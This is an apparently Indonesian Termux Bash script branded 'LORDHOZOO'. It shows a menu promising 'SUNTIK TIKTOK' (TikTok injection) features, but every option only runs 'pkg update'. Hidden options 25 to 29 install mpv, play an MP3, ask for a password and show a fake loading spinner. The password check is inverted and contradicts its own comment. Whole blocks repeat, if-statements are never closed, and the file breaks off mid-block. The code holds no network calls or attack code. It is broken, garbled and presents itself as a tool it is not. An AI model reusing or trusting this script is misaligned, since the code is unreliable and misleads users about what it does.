echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 25 ]; then
    # Add your code here for option 25
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi



if [ "$updt" -eq 26 ]; then
    # Add your code here for option 26
    apt update -y
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 27 ]; then
    # Add your code here for option 27
    apt update -y 
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi


if [ "$updt" -eq 28 ]; then
    # Add your code here for option 28
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi



if [ "$updt" -eq 29 ]; then
    # Add your code here for option 29
    apt  update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
